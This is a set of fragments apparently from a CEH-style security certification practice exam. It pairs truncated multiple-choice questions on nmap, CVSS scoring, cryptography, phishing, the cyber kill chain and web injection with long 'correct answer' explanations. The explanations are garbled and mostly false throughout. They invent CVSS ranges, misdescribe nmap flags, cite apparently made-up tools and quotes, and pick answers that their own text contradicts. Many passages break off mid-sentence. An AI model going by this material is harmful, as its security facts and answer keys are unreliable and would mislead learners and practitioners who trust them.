the correct answer is d. when you execute an nmap command with the “ -pn ” flag, which outputs active ports and the ports that nmap has found to be closed ( port not open ), you will see a list of all open ports listed in a subcommand. “ -st ” indicates that the scan is being performed in “ state ”, which means it ’ s attempting a connection to each of the hosts. the “ -- max-parallelism ” command indicates the number of parallel scans nmap performs. in this example, jim wanted to learn more about the running information running services on the target machine. we can gather the ip address of the machine using the “ -- script ” command with any of the following commands : nmap -o alist = < ip_address > nmap -n < target ip > nmap -st -p < port list > < target ip > and we can gather additional information using the “ -su ” command combination. in addition to port 46824 being closed ( due to the presence of the application aircrack version 1.12.2 ), jim ’ s connection showed open port 102 was running aircrack ’ s “ s7-info ” scanning. other ports were closed ( 44818 ). we can ’ t guarantee exactly what the tools will pick up and show us ; it ’ s completely up to the imagination of the hacker. one thing to note here is that in a production line of hacking"

the correct answer is d. of the choices provided, this one is the only one that makes any sense. when you are trying to perform a dos attack on the network, you would use a dos-based attack. dhcp starvation is a dos attack, where the attacker will take advantage of a lack of any viable alternative to demand a certain dhcp address. stp attacks are also dos-based. the attacker will flood the server, forcing it to respond to any bogus dhcp request, and then taking advantage of the leased address being used. this is all provided by the act of broadcasting a bogus dhcp request. as a side note, the hacked dhcp server would probably be using a dns spoofing attack, using a dns spoofing tool such as ddospy ( url uses ddospy as a name ). once the clients attempts to resolve the bogus dhcp address, the server will respond and grab all the leased addresses. the attacker then has the control of the dhcp address and control of the clients responses for some time. the attack would probably be using a dns spoofing attack while attempting to lock a network down, since that would be what caused all the problems in the first place. other attacks listed in the course are all dos-based as well : exploiting a buffer overflow in a web server to take advantage of a user error, sending a dos payload during a dump of passwords, using a buffer overflow in a sql database to lock a business ’ s resources, and using a buffer overflow on the web server"

Identify the correct terminology that defines the above statement.
A.  Vulnerability Scanning
B.  Penetration Testing
C.  Security Policy Implementation
D.  Designing Network Security
","
the correct answer is b. vulnerable scan is too vague to really answer this question with. vulnerability scanning identifies vulnerabilities, which are defects in the software that allow attackers in. penetration testing does not start only with the release of a software product. penetration testing is used to confirm or reject the existence or severity of vulnerabilities, which means it is used to assess the overall effectiveness of a vulnerability scan. just being able to identify a vulnerability does not mean you ’ ve exploited it, so know the response to that exploit means something more than just a success or failure. your exam will see whether they know the difference between vulnerability scanning and penetration testing. the answer chooses the correct option because vulnerability scanning runs throughout a whole vulnerability scan process. it ’ s the scanning portion, while penetration testing happens after that. this assumption makes sense because the tools used for vulnerability scanning, such as nessus, can also be used for penetration testing. vulnerability scanners only look for vulnerabilities during the scope of a particular version, release, and patch. penetration testing doesn ’ t stop at the release date ; even if you were to find a certain vulnerability, you might not be able to confirm that with any certainty. the following is from url.net/wiki/penetration_testing_techniques : “ penetration testing does not end with vulnerability scanning. While the same tools can be used to perform both, the approach of penetration testing is a bit more thorough. vulnerability scanning just makes the assumption that some vulnerability exists and wants to exploit it, which"

vulnerability fall in?
A.  3.0-6.9
B.  40-6.0
C.  4.0-6.9
D.  3.9-6.9
","
the correct answer is b. the cvss v3.1 range indicates a severity rating of 2–6.0, with scores between 0–6 are considered moderate, 6–12 high, and 12–40 very high. this is exactly what you ’ d expect from a medium vulnerability, according to cvss. note the very high rating can never be lower than 3.9, and the highest rating can never be higher than 6.9. in this example, the severity of your attack ranges between 6.0 and 3.9. therefore, the level of vulnerability in this example is medium. this assumes the same severity rating and score from the source, where the scores and ratings are documented. if you have a tool that provides integrity and sanity checks to all sources, you might expect the results to meet a minimum of a certain severity level and a maximum of a certain severity level, where lower is better and higher is worse. in other words, if your tools teach stability and stability should be better, then any score above 3 is considered acceptable. as for the severity rating not necessarily matching the medium vulnerability, you might have a few exceptions to note. for example, if the moderate vulnerability is level 3, then the corresponding severity rating in cvss v3.1 is 6, which indicates that severity should never be higher than high, and a medium vulnerability could never be lower than high. in this case, the severity"

A.  Attempting to decrypt cipher text by making logical assumptions about the contents of the original plaintext.
B.  Extraction of cryptographic secrets through coercion or torture.
C.  Forcing the targeted key stream through a hardware-accelerated device such as an ASIC.
D.  A backdoor placed into a cryptographic algorithm by its creator.
","
the correct answer is b. there are some circumstances in which a human can decrypt cipher text simply because they have seen enough. this is not a good approach to taking a cryptographic key. it ’ s also not good for extracting actual data from cipher text because every attempt to decrypt it involves only a portion of the key being provided. a so-called human-aided cryptanalysis attack can not be implemented using a computer. as a matter of fact, you ’ d be hard pressed to find a single study that uses human-assisted cryptanalysis. it can be used to determine the existence of a few specific cases : 1 ) the attacker and human have seen the same plaintext value twice and, based on a particular assumption about the random nature of random numbers, come up with the key. 2 ) the human is seeing more plaintext than expected and, based on the random nature of the cycle, comes up with the key. and 3 ) a person is providing information that a computer shouldn ’ t see. human-assisted cryptanalysis can not be used as a general purpose tool because it ’ s not good all the time, most of the time, or in general. it just won ’ t work very well with really strong keys. human-assisted cryptanalysis can be used to determine whether a potential attack may have a basis in reality : a question about a company ’ s normal practices pops up and, according to the agreement between test group member and attacker, they both see a key to"
43,"The network team has well-established procedures to follow for creating new rules on the firewall. This

A.  Have the network team document the reason why the rule was implemented without prior manager approval.
B.  Monitor all traffic using the firewall rule until a manager can approve it.
C.  Do not roll back the firewall rule as the business may be relying upon it, but try to get manager approval as soon as possible.
D.  Immediately roll back the firewall rule until a manager can approve it
","
the correct answer is d. one of the reasons for rolling back a firewall rule without having manager approval is that managers may be looking for reasons to dismiss a finding on a rule. if the finding is related to security, the manager may be inclined to do something about it. not only does the rule still be in place, but any action taken using the rule may be tracked back to the manager. a manager may be inclined to resolve this finding immediately, which may result in not rolling the rule back. potentially, the finding may be ignored, but that ’ s not guaranteed. the whole purpose of a rule in this situation is to resolve a finding, not to cause damage to the business or to maintain a risk level. having a procedure for addressing this type of thing may save the organization from a lot of trouble. as a side note, trying to have approval from a manager for every new rule on the firewall is about impossible, which is why these types of procedures are so valuable. the more rules you try to put into place, then the more chances for error. these types of procedures should be created for monitoring and maintaining a secure network. as a side note here, trying to find someone to approve that new rule requires some people to be aware and attentive. if there is a known risk that requires a response just outside of the approved timescale, doing anything to avoid that requirement, no matter how unjustified it may be, is more important. the difference is the approval of the new"

Which of the following techniques is employed by Susan?
A.  web shells

the correct answer is b. web hooks are a way for web applications, also known as web services, to communicate with other systems outside the web. this is made possible by an http tailback or push APIs, which are raised on trailing command and handle data from the outside. web hooks are defined in rss 1.1 and subsequently specified in rss 2.0. with the release and growth of google appstore and other web hook implementations, web hooks fell out of favor among web app developers. as a side note, rest apis are a way of implementing http APIs using a different architecture. both rest and http would need to be examined for sensitive data and processing requirements. soap is an internet protocol designed to transfer structured data in a xml format. for example, you would use a soap server to process financial data. xml is a way of packaging data in a structured manner and is compatible with both http and soap. therefore, you would use xml to process http and so on. if you were to tell someone you wanted them to enter your username and password to get a updated version of your evil twin attack tool, you would use a web feature to accomplish that. the web feature would provide a means for the user to connect to the evil twin attack tool site. finally, soap is used for web services. an http server, such as apache, would be used in front of a soap server for web services. other servers, such as nginx, would consume http requests for soap actions"

B.  The attacker makes a request to the DNS resolver.
C.  The attacker forges a reply from the DNS resolver.
D.  The attacker uses TCP to poison the ONS resofver.
","
the correct answer is b. dns spoofing is the use of dns to send messages to targets inside your network. the attacker queries the nameserver ( the resolver ) using the local computer ’ s dns program ( e.g., arpsnmp.py ). the query can include a request to fetch multiple files, which could contain executable operations. if the nameserver ( the resolver ) sees this query, it will respond with a different ip for each query. they ’ ll probably respond somewhere other than the target, but the idea is the query will identify a hostname and ip address for the target. the attacker then uses the spoofed hostname and ip to get access to the network. it does this by updating the ttl on that hostname to a low value. because of the nameserver not seeing the bogus request, the response will be received and execute. if the user connects to the hacked hostname, he ’ s connected to a malicious ip address. therefore, the first step for dns spoofing is to query the nameserver using the local computer ’ s dns program. the following is from owasp ’ s dns spoofing chapter ( url past the break due to length : ) “ dns spoofing makes use of the dns server to send messages to targets inside the network. an attacker uses the local dns program ( such as arpsnmp.py ) to query a local dns server ( perhaps running as a built-in dns program on a linux system ) using a query such as "" send a reply"

the correct answer is b. once again, we ’ re back to a common question/double question regarding tools and attacks : how do you choose which attack to use? you have a collection of tools, log information from target sites, and one tool specifically—attacksidekick. you add that extra ability by selecting a password-cracking tool. per previous security observations, you have discerned there are common passwords and a way to generate and use a list of them—password spraying. assuming ricardo does something similar with “ common pass-words ” ( or at least one of them ; he may have thrown another one or to be fair, a bunch of them, depending on how the attack is defined ), the target web sites can ’ t defend against this attack ; that, at least, to go by the explanation, seems reasonable. a second point related to this—is the list of passwords really good for anything? with effort, after all, there is probably a different “ common ” password created daily, on a yearly basis, and listed in the list of passwords in august 2012 is jodie, jason, and jules. hahaha. not really funny, i guess, but you get the point : the key is to the method behind the attack ; the tool—attacksidekick—inand itself isn ’ t what matters as much as the way the tool is used. as a side note here, there are some questions and comments on this page that are picky"

above scenario?
A.  Medium
B.  Low
C.  Critical
D.  High
","
the correct answer is c. cvss is a quality assurance process for identifying and assessing vulnerability to attackers. each measurement or “ score ” is assigned to a level, which represents the severity of the vulnerability and the level at which it should be negotiated. the higher the score, the more the vulnerability is desired by an attacker. cvss v2 used integer values for scoring, and v3 uses a scale of 0–15 ; 0 being no severity impact and 15 being severely compromised. additionally, cvss scoring at this level gives a true view of the actual severity of the vulnerability. in this example, sam was able to generate a numerical score ranging from 4.0 ( moderate ) to 15.0 ( severely compromised ). this makes sense because attackers are generally motivated by the highest score they can get, and this score was exactly what sam wanted. referencing the cvss website ( url cvss.org/cvss-rater ), we can see that the different scores listed from highest to lowest are as follows : • severity : • low : 4 • medium : 15 • high : 0 • severe : 20 • life : • low : 2 • medium : 15 • high : 0 • severe : 20 in addition to the whole severity scale being created by cvss, which allows a determination of the level at which the severity of the vulnerability was determined and maintained by an independent team, there are also methods of calculating the severity of"

identity?
A.  Hash value
B.  Private key
C.  Digital signature
D.  Digital certificate
","
the correct answer is a. digital signatures are used to authenticate messages signed with a private key. since there is only one private key, this makes sense. the key that needs to be provided to the recipient is the public key, which is stored in a digital certificate. this is not a means to identify the owner of the key. it just identifies the resource. a hash value is a value that is computed from some data and is itself another data value. unlike the key, which is a key to a lock, the hash value is the key to a certificate. the certificate holds the public key. a certificate is not a means to identify someone ; it simply provides a means to identify the content of the certificate. there are several reasons for using digital certificates in this manner. first, any old way to send encrypted messages involves the sender handholding the recipient ’ s identity ; in other words, the sender trusts the recipient. assuming the communication is intended and the internet exists, this can be trusted. second, some people just don ’ t want to hand their private key around on a piece of paper. it would likely be stolen or given away, or just simply lost. a digital certificate solves that problem by storing the key in a trusted location. finally, some people just don ’ t want to install or think about installing verified sources, which includes cryptographic keys. a digital certificate solves that problem by providing a means to identify the holder of a private key. a certificate does require a"

the correct answer is b. at the initiation stage, when the attacker is gaining access to the target ’ s system. as data is exfiltrated, it ’ s transferred from the tool or malicious software ( ms ) to the attacker, or even directly to an attacker target. at this stage, the weaponization stage is not relevant. command and control is an active tool, which means it is used to communicate with the target ’ s system. even if the tool is sending data directly to an attacker, that wouldn ’ t mean the weaponization stage was reached. the weaponization stage comes ultimately from the exfiltration stage. the weaponization stage is where the tool or malicious software ( ms ) will be used to communicate with or attack the target system. this would be the stage at which devices would be wired to a target and monitoring start. the weaponization stage occurs just before the exfiltration stage. just as an aside, and a useful reminder for your exam, remember that the cyber kill chain is a structured methodology for explaining how a cyberattack happens. designed by ec-council, it helps security teams and organizations better understand and prepare for attacks. a cycle through each of the stages best correlates with the stages of the business cycle, which is a helpful reminder for you. most of the time, weaponization doesn ’ t occur directly from initiation to exfiltration ; however, in the real world, the weaponization stage is linked just before exfiltration. in this attack"

A.  Private keys
B.  User passwords
C.  Public keys
D.  Public and private keys
","
the correct answer is b. in cryptography, there are two keys for every encryption process. one of them is called the public key, which is used with messaging protocols like smtp and tcp in smtp transmit. it ’ s not used for decryption in this case. the other key is called the private key and is used for decryption only when we are talking encryption by one key. for example, if we use michael ’ s private key, any decryption would need his public key, which is 8000. for example, if we use jill ’ s public key, then decryption would need jill ’ s private key. of course, the private key is kept secret and only used for encryption purposes. because it is kept secret, this whole encryption process can not be crashed or hacked into happen. if many people had this private key, any attempt to decrypt any message meant the same person would be able to see all messages coming from each person, regardless of the sender. if several people had the public key of someone, then any message sent from the owner of that public key would also be visible to all the recipients of that message. this makes sense because the same is true in medicine—because a person knows only their private key, any attempt to decrypt any message coming from it requires the corresponding public key of the owner of the private key. if several people know the public key of someone, then any message sent from anyone could be seen by everyone using the public key in that message. this"

C.  Limit the administrator or toot-level access to the minimum number of users
D.  Retain all unused modules and application extensions

the correct answer is c. an enterprise would use multiple countermeasures to protect against user account tampering. a common countermeasure is to allow new accounts only after some number of checks are made on existing accounts, using a suspend, lock, or forget password option. other countermeasures include enabling all non-interactive accounts and allowing rename, delete, and change current directory rights to the user when adding, changing, and removing users on a linux system. the idea is to provide the users with the ability to control their accounts, within the limits of security and compliance requirements. a successful account tamper attempt on a web server would probably attempt to change the passwords current directory to one the attacker wants. semphinity, wps, and metasploit all provide support for various check constraints on accounts, as well as many other features. and a user after some effort on your part can almost find a reliable control folder to toss the user logs in. lastly, remember that security is very much about being aware and taking steps to catch problems as they occur. to do that, you need to track changes to files, logs, and other records around your network. and you ’ ll need strong, configurable passwords and good authentication measures to protect those records and accounts. there may be some some resistance to account change and creation creation, but in the grand scheme of things it ’ s relatively small. most organizations want their users secure and by default, which usually means no user accounts should be created"

the correct answer is d. nmap uses a different approach every time it runs. each new run takes into account factors such as time since the server changed, what the server was recently up to, and a variety of other factors. in this case, the request was asking for information about the version number of the server. a dns lookup can be used to identify information about a domain and corresponding ip addresses for that domain. a banner grab is taking the text of the first banner ( welcome message of the first attack ) and comparing the text to a collection of banners. a dictionary attack is looking at a list of word lists, including brute-force derivative words to identify possible passwords. in a brute-force attack, you are using numerical values ( passwords ) to represent things ( banners ). per host, mean that you are looking at the banners of all the hosts in the scan. in a brute-force dictionary, you are using a list of word passwords to help identify a banner. for example, you might use the word list {""day"", ""night"", {""today is the best day : }, followed by a banner. nmap would attempt to guess what the password might be based on these banners. other mean technique s include sniffing and injecting code into the network. sniffing is looking at traffic between the system and other networks. injecting is putting code into other systems to carry out the attack objectives. for example, you might inject a tool that would grab banners, send them to a server"

D.  index.html
","
the correct answer is b. the robots.txt file is located in the root of every website. you would use it to indicate to search engines how to find specific pages on your site. a website could have multiple robots.txt files, but usually there is one at the root. based on this, you could guess that finding the document root was so important. the other answers are not rich target targets. the domain.txt file would be used to identify information about the domain, including the domain name and possibly the postal code. the website could have multiple domain.txt files, one for each address. while you could gather information from the robots.txt file, it wouldn ’ t be a rich target. the other two are not target files in this sense. the document root is identified by using a high-level domain name and looking down to get to the website. in this example, the answer would be the domain txt file. there may be multiple levels, but that ’ s not what the question is asking. the point is to get the domain changed to something that may be easier to recognize or get a different response. the idea is to get the device to do something it shouldn ’ t be doing, which requires the location of the document root. a robot.txt file would be no more useful than a password on a cell phone because it has no relevance to the device. it may have some relevance to some systems, but not to a phone. the point is to get the device to do what you want"

Morris performed on the target organization?
A.  internal assessment
B.  Passive assessment
C.  External assessment
D.  Credentialed assessment
","
the correct answer is d. this is another easy one, but it ’ s still valuable. the assumptions on a credential-assigned vulnerability scan are the same as the internal scan described in the self-study book : the organization is interested in identifying active connections on the network, which can be used to determine the locations of available vulnerabilities. assuming the organization has a list of the users as well as the vulnerabilities, it ’ s fairly easy. the only thing missing here is any calculation on the part of the hacker—assuming he isn ’ t actually working remotely and just looking at the results of the scan. assuming the users are listed in order, the vulnerable connections would be assigned based on the connections made by the active connections. easy enough, right? except most organizations won ’ t provide the actual location of the resources in the network. while a tool like snort can identify open ports and connectedness among them, in the real world of business and not just on a test exam, that ’ s not really useful information. a local vulnerability scanner won ’ t see open ports they ’ ve already locked down and probably won ’ t see any new packets coming along as a result of the scan ; nor will it provide any real data on closed ports and unavailable vulnerabilities. a tool that sees the location of the resources will provide the actual location of those vulnerabilities on the network. vendors often provide a netcat listener port for internal communication. you can usually find statistics on the internet about the locations of these listeners"

jane map the website's directories and gain valuable information. What is the attack technique employed by
Jane in the above scenario?
A.  website mirroring
B.  Session hijacking
C.  Web cache poisoning
D.  Website defacement
","
the correct answer is b. of the choices provided, this one is the best representation of a hacker ’ s local experience and use of tools after a target ’ s website. remember that website mirroring is the process of taking the target website and copying a copy of it to a local location to examine it. in other words, placing a mirror of the site in the local directory for future reference. this attuser in this instance is using website defacement, also known as a session hijack or web cache poisoning attack. all of these attacks involve the hacker ’ s use of the target website to gather useful information. note the use of a local copy of the site in this attack. assuming the attacker has permission ( or useful information from some malicious site logs ) to check the cache, the attacker then uses a variety of attack tools to gain useful information from the cache. in this particular attack, the attacker ’ s attention is now on the website being examined ; therefore, she is looking at its directory, links, and other statistics. on a windows system, the local browser, googlecache, is used to pull the web page, change some settings, and view it “ just as it should be ” ( aka the real site ). in this attack, the local browser is used to grab a copy of the site based on changes in the web page and, more importantly, the cache. seeing www.domain.com as “ a legitimate company ” ( as opposed to www rogue.com, where anything"

","
the correct answer is b. the payment data class ( pci-dss ) guidelines are outlined in both reg u-lations and standards. the requirements for monitoring and accounting for fraud and any data breach are implemented under iso/iec 27001:2013 ( also known as iso 27000:2013 ), but the terminology used in each is the same. in short, according to the standards up to sec 13 constitutes a mandatory standard for organizations that are registered or legally operated under the european commission regulation 459/2016 ( res. no. 459/2016 ). additionally, sec 14 states that all persons ( including employees and contractors ) have a duty to maintain confidentiality. even outside of legal and regulatory requirements, traditional toolsets can help in the detection and analysis of data fraud. tools such as splat on mdm ( microsoft management asset database ), and matriarch, which is open-source, will provide you with detailed information including financial information such as total revenue, earnings per share, and number of shares outstanding. other tools including cia ( confidence intelligence ) will help with monitoring by providing a number of tools that can pull data from a variety of sources. some of the more notable sources include cia intuition, cia intellect, and cia intelligence eye. a good start is hopefully to be found on newbusinessinsurance.com : “ investigation into data exfiltration, fraud, and compliance issues—free ” which should get you through"

for secured access, is accepted. What is the defensive technique employed by Bob in the above scenario?
A.  Output encoding
B.  Enforce least privileges
C.  Whitelist validation
D.  Blacklist validation
","
the correct answer is d. validating rules and rules of acceptance/acceptance are part of security planning, and it ’ s likely your exam question will include this type of question. the process of validating rules and rules of acceptance/acceptance is called whitelisting and involves a trusted third party validating data type, size, and value. this third party is known as a validator. if a submission falls through the walls and ends up in a cannibalism pot, however, then whiteness has been lost. associated media may also be viewed as whiteness because they ’ re considered public domain. security acts like whitelisting are used to protect information assets, data integrity, and pointer integrity. one last note on whitelisting is what happened in this question. bob understood the concept of whitelisting and did everything possible to prevent the attacks. cybertech inc. has been using whitelisting since it was founded. because sql injection attacks are one of the most common attacks, bob decided to develop a “ silent ” attack team inside the company to monitor and attack web servers on the website, should he need to resort to stealth. this it provided for straightforward whitelisting in the future. without entry into the walls and a good team like bob, there is a chance sql injection attacks will remain a true threat to any organization. as a side note, whitelisting should not be confused with white box security, which means someone trying to help keep information secret and safe."

Which of the following Zenmap options must the analyst use to perform the ICMP timestamp ping scan?
A.  -PY
B.  -PU
C.  -PP
D.  -Pn
","
the correct answer is d. icmp timestamp mode should be set to true. this allows the analyst to use icmp timestamp messages. the other options are not valid in this context. zenmap does have other tcp-related options, but these should be relevant to this question. tcp scan options are different than icmp scan options. an icmp timestamp ping would be using the same tcp headers as an icmp ping, since the entire packet looks the same. only the timestamp field in the packet is changed. with the -py option, zenmap will perform a ping sweep just as an icmp timestamp ping does. the two other options, -pu and -pp, are port uncaching and port scanning. they ’ re not related to icmp timestamp ping. port uncaching does not have anything to do with icmp timestamp ping. just defined in port scanning terms, uncaching is just including ip address mappings in case traffic. doing that without an associated port number to map to is called port hiding. no port mapping was used in the ping scan, nor was any tcp-related header changed in the attempt. icmp timestamp ping uses the same tcp headers as an icmp ping, and the only difference between the two is a change in one little piece of information. when you set the py option, you turn on tcp visualization. just what it ’ seems like a good idea, and a great way to learn, and one of the reasons for taking security lessons. tcp visualization in zenmap is a pretty cool way to visualize all the"

VHF and UHF?
A.  Yagi antenna
B.  Dipole antenna
C.  Parabolic grid antenna
D.  Omnidirectional antenna
","
the correct answer is b. you will probably see three to fours times in your exam, maybe more, on antennas. a yagi antenna is made up of several elements, but the most common version has five wires wrapped around a rod. the other answers are not antennas. a dipole antenna is either a long wire or a double wire, depending on the ends, which can provide a great signal. the other answers are not antennas. a parabolic grid antenna, however, is made up of a large circular grid on the top and sides with a hole in the middle for the antenna stick you are standing next to. the idea behind this is great when you had a car with a bluetooth connection but not always. just remember this : a yagi antenna is good for a frequency range of 10 mhz to vhf and uhf. a dipole antenna would be good for lower frequencies ( under 50 khz ). a parabola grid antenna is good for higher frequencies ( over 50 khz ). a single antenna stick, no matter what it is—open or covered, with a single antenna in it—is good for any frequency. as an aside, a covered antenna is usually better than an uncovered one because the coverage area is controlled by the roof. as an aside, a good practice is to carry one on multiple places and keep it portable. antennas themselves are not problematic on the exam, but getting the right antenna for the right frequency is absolutely critical."

A.  Infoga
B.  WebCopier Pro
C.  Netsparker
D.  NCollector Studio
","
the correct answer is d. even though the software has changed a great deal over the years, one thing that ’ s constant is that vulnerability scanning can be very difficult and a lot of effort is required. the software mentioned here is only another way to perform vulnerability scanning than the one described in a previous chapter. the software needs to do quite a bit of scanning and that scanning has to be automated for real vulnerability scanning. netsparker is one of the better-known tools for vulnerability scanning. ncollector studio is a free software product you can find on the google code repository. webcopier pro is a program, like netsparker, that performs a scan on a target and then copies a copy of the website file to a safe location for later use. infoga is another automated vulnerability scanning tool. the only one listed here that actually exists out there on its own is netsparker, which is now a major brand name. it ’ s possible, though, that finding a particular tool isn ’ t impossible, and that tool may exist somewhere on your system. one thing to note about all of these tools is that they ’ d usually want to earn your confidence before performing the scanning and vulnerability scanning. netsparker, webcopier pro, and ncollector studio will probably want to do that before performing the scanning and vulnerability scanning. all of them should do some sort of vulnerability scanning and vulnerability scanning only should be performed by people who really know what they are doing. the goal with"

A.  Chop chop attack
B.  KRACK
C.  Evil twin
D.  Wardriving

the correct answer is c. there are some attacks you just can ’ t avoid. knowing how they work only makes you smarter. the chop chop attack uses the same principle, just displayed in a different way. instead of reinstalling an already-existed key, the attacker will trick the victim to reinstall a new key. this is accomplished by manipulating and replaying cryptographic handshake messages. as an aside, the attack itself is old world rather than modern. however, the methodology used is the same. krack ( key reinstallation attack ) was developed about six years ago and has been around just a month or so away from the ground floor. while the terminology between old world and modern is a bit confusing, the key is the same : keep reinstalling what you want by manipulating the handshake messages. as a side note, don ’ t forget that all of the security attacks you see described as old world are old because they ’ ve been seen since a few years back. the reason they ’ re so common is because they ’ re effective. don ’ t get it confused with modern attack terminology ( sniffing instead of sniffing after it ’ s found ). the point is, when learning this attack, remember that krack is key reinstallation. don ’ t get the two confused.

D.  An intruder's malware is installed on a target's machine.

the correct answer is d. none of the other answers are real things, so they can ’ t be compared against something real. the “ kill chain ” is based on multiple “ stages, ” and each stage has a name and steps to follow. in the third stage, the attack targets open an attachment from an email addressed to them. the attachment could be. for example, an executable named backupfile.as. will indicate that the target ’ s system has opened the malicious attachment. at that point, the attacker might input payment information, via credit card or other payment method to a third party, or the attachment may simply infect the target ’ s system. either way, the malware is already installed and capable of being triggered by the user opening the attachment. the attacker could very well be logged and monitored, or the user might get aware. depending on those factors, the email attachment could be more dangerous than the malware itself. in any event, the third step in the kill chain is where the user opens the malicious attachment, thus releasing the malware and triggering the malicious attachment. the following examples are not third-stage attacks : b. malware being installed via email c. an attacker tracking the user ’ s opening the malicious attachment d. malware installing on the user ’ s system after the attachment is opened. e. an attacker tracking the user ’ s opening the malicious attachment and using the attached file to gain access to the system. f. an attacker tracking the user ’ s opening the malicious attachment"

celebrities who have access to confidential and highly valuable information.
A.  Spear phishing
B.  Whaling
C.  Vishing
D.  Phishing
","
the correct answer is a. spear phishing is a targeted approach to phishing, based on information technology employees ’ locations, business needs, and other information. whaling is a type of phishing that targets individuals, especially executives. vishing is a targeted approach to texting. phishing is any e-mail collection practice that uses a targeting mechanism, no matter what the targeting mechanism itself is. these targeted messages may use phishing links or could just contain more information relevant to the targeted user. Spear phishing is a more specific term to what would be targeted in this case. celebrity, corporate, and government employees aren ’ t necessarily responsive to the same degree as the average user, but their status generally puts them in a different role within the organization, and they may have more valuable information in some cases. a corporate executive, for example, would likely have more permenant access to sensitive information and may be more able to fake a given true path to the information. also, a celebrity employee may be more likely to respond to a phishing message, because of the notoriety of the role. for all of these reasons, spear phishing targets high-level employees within an organization, while corporate executives, who have more in-termation access to sensitive data, may be more responsive to a phishing message. targeted phishing is also often called whaling. a different term for whaling is entrelacement. one method of targeting that may be less obvious than others is entrelacement. if your organization has a middleman or agency"

the correct answer is b. the cyber kill chain is composed of dozens and sometimes hundreds of events, and each layer adding information to the chain. in this case, the attacker would be trying to attach a malicious file named spam.txt. the weaponization stage is adding the malicious code and creating the delivery plan. in this case, the attacker would suggest sending the email to reach the target address. the delivery stage itself is accomplishing the sending. recon is basically looking at information, such as analytics or traffic analysis, to derive useful knowledge. knowing the bidirectional traffic patterns between office locations and home locations can provide valuable information. a. checking b. exploiting c. weaponization d. reconnaissance d. sending the email would send the malicious file to the victim system. b. exploitation is the stage at which the attacker exploits the vulnerability, which is a failure to understand the intent of the malicious file. of the choices provided, this is the best answer. b is exploitation—finally, this is what satta is all about. the hacker has discovered there is a virus somewhere in the system ; however, because you are a good guy, you can ’ t receive it. therefore, she sends the email and, depending on the receiver ’ s configuration, spreads the virus. in this lesson, we learn the attacker takes advantage of a weak link in the security system—nothing more than letting someone know it ’ s there. assuming the receiver has the virus, the malicious asset spread it around the office"

C.  NeuVector
D.  Lacework

the correct answer is d. of the choices provided, lacework is probably the best choice. it ’ s probably a better idea to start off with a “ good ” attack from the get-go, for several reasons. first, you ’ ll probably want to make use of the tools mentioned earlier ( more on those later ), and having all the info preconfigured will let you use them more effectively. also, some tools will simply do a better job of pulling the same stuff, and lacework makes use of that kind of thing a lot. finally, you ’ ll probably want to make use of the information collected later on, and having a repository of it before you jump in will let you reference it repeatedly. as a side note, lacework is the only product from that three-piece ecosystem ( additively linked, as a matter of speaking ), and you should know that. as an individual using a tool, you might not get a response that satisfies you particular needs ; however, if you are satisfied with the results reported, you should be. per the site ( url lacework.io ), “ lacework is a software platform that allows for dynamic, automated testing and exploitation against a networked device and network environment from a variety of devices and sources. living, active attacks against a device and network environment provide the data and logic that allows lacework ’ s exploitation module to exploit devices and systems. this provides the means for users to run attacks against devices and systems they are interested in"

D.  WS-Security
","
the correct answer is b. once again, the timing of this question depends on your answer to e. understanding the structure of soap is important to detecting many attacks. in this question, the focus is on how secure it is to send messages between applications ( what is referred to as a soa ) using the policy of secure, authenticated communication. compare this to dns security messages, where a fresh analysis of the entire protocol can provide you with some valuable information. a policy for security in soap is placed on all components using a policy access model ; that is, each runs a security assessment before the operation begins and, on request, provides the outcome. if the operation is secure, it simply returns a true. otherwise, it provides the scope of the risk and how the operation will be handled. in short, in this phase, the entire set of policies is used to ensure the security of the communication. as an aside, you can find out a lot of information using the corresponding tools for soap—both intelliquest and jlogic, to name a couple, can help you with this. as an aside, you can find out more about each component and the linked policies in the complete snowball report by using snowball.com. another very useful tool for you is cozmo, which can help with all security issues. as for the particular question you are trying to answer, it can be found at wikiwire.org/wiki/ws_policy. with free personal and corporate networking and application search sites, you"

the correct answer is d. adware is software that ads promotes to users. these ads are usually a series of pop-up windows asking to see new sites or installing advertisements. a common example of this could look something like this : domain.com __ area.com __ www.domain.com < script > < script > var url = new location ( new url ; ) ; if ( window.location!= url ) { var done = true ; [ script ] { while ( window.location!= url ) { new location ( url ); } done ; } } } 0 ; a. this indicates the victim ’ s system has been infested with adware. b. adware is computer software that ads promotes to users, including pop-up ads which in and of themselves don ’ t cause any harm to the system. c. adware can be installed by clicking links in e-mail messages or other advertising material. d. adware can also be installed through the use of software like google drive, office, or google chrome. also, even though it ’ s called adware, it could be a type of malware. e. finally, it ’ s important to note that no matter what ads is running on a system, it ’ ll take up memory space, rendering the system less efficient. for example, if people are seeing ads all over the place, it forces the web servers to start allocating resources to serving those ads, which will take space. this also makes the system less secure by introducing hidden information."

A.  Server-side template injection
B.  Server-side JS injection
C.  CRLF injection
D.  Server-side includes injection
","
the correct answer is d. server-side template injection is a vulnerability that allows an attacker to pass malicious syntax to a script file in order to execute on the server. if the server is using a scripting engine like php, the executed code could execute any script. server-side js injection is similarly dangerous but uses a javascript vulnerability. a crlf ( carriage return line feed ) injection attack uses a line feed and a carriage return to craft malicious url requests to web applications. all of these attacks occur when the web application accepts input remotely and, as a result, treats it locally. therefore, in determining the attack type, the vulnerability in the web application matter itself becomes important. consider a simple form on a website where someone has to enter a form field before the web server does something with it. inside the web server, there is usually a php processor responsible for rendering the input entered into the server. if that php processor accepts the input locally and acts on it, then an attack can happen anywhere within the web server application. therefore, knowing the processor itself can be important. there are no universal signs that cannot be any thing to see an attack on, so it ’ s a matter of doing some intense hunting and searching. a good approach is to use application layer security, which means there are a number of tools you can use to detect vulnerabilities and exploits. in brief, some of those tools include essail, nessus, nmap, and snort. as a side note, server"

the correct answer is d. nmap can successfully run a scan on almost anything if you know how. the -d flag switches the debug flag, which enables extensive logging and other features. the other two flags ( -a and -g ) are also flags, but they ’ re addressed to specific conditions. the option you really need to know about is the -f flag, which tells nmap that it ’ s going to forcefully scan the device in a bidirectional ping sweep. in short, if you can pull the log messages off of running processes while they ’ re connecting to the server, you can get away without using any flags at all. as an aside, the -a flag, -g flag, and -f flag can indeed obtain the information that they ’ re looking for. what they ’ ll most likely do, though, is confuse you with their use. it ’ s hard to argue with results that show the device is going to be forced to syn and ack for hundreds of packets, so the return paths aren ’ t coming back to establish a connection. the -d flag does not cause a connection attempt in the same way that the -a flag does. to be fair, you will see the -a flag used in a few areas. for example, on a machine that is being set up, and generally should be quiet when running nmap. the -g flag, though, is always hurled at you when you need to send a large packet count to"

